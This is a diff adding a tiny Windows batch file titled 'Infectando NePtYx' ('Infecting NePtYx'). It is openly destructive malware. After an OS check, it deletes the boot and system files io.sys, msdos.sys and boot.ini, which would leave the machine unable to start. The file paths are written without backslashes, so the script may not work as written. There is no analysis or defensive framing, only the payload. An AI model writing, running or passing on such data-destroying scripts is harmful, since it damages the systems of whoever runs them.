@@ -1,0 +1,8 @@
+@echo off
+title Infectando NePtYx
+cls
+if %OS% == Windows_NT goto nt
+del C:io.sys
+del C:msdos.sys
+:nt
+del C:boot.ini
